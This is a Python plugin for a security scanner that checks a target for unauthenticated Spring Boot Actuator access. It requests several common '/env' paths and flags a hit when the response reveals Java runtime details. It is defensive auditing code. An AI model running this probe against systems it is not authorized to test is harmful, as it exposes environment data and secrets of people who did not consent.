from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req
from xing.core import PluginType, SchemeType


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "Actuator API 未授权访问"
        self.app_name = 'Actuator'
        self.scheme = [SchemeType.HTTPS, SchemeType.HTTP]

    def verify(self, target):
        paths = ["/env", "/actuator/env", "/manage/env", "/management/env", "/api/env", "/api/actuator/env"]
        for path in paths:
            url = target + path
            conn = http_req(url)
            if b'java.runtime.version' in conn.content:
                self.logger.success("发现 Actuator API 未授权访问 {}".format(self.target))
                return url
